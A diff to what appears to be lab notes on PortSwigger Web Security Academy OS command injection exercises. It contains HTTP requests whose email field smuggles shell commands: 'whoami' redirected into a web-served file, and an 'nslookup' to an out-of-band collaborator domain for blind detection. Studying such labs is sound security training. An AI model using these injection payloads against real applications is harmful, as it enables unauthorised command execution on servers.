@@ -44,3 +44,12 @@ Host: example.com
 csrf=prgoQxF6UK1ef3bhTIaliAIQmohfpYsJ&name=test&email=ssss%40test.com+%26+whoami+>+/var/www/images/output.txt+%23&subject=1111111&message=111112
 ```
 Now browse the output.txt https://example[.]com/image?filename=output.txt
+### Blind OS command injection with out-of-band interaction
+The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.<br>
+**Payload used  in email field(URL encoded)**: test@test[.]com & nslookup BURP_COLLOBORATOR_SERVER #
+```
+POST /feedback/submit HTTP/2
+Host: 0a88006f0402496f85b3d550003e00d3.web-security-academy.net
+
+name=test&email=sss%40test.com+%26+nslookup+xxxx.oastify.com+%23&subject=ssssss&message=sss
+```
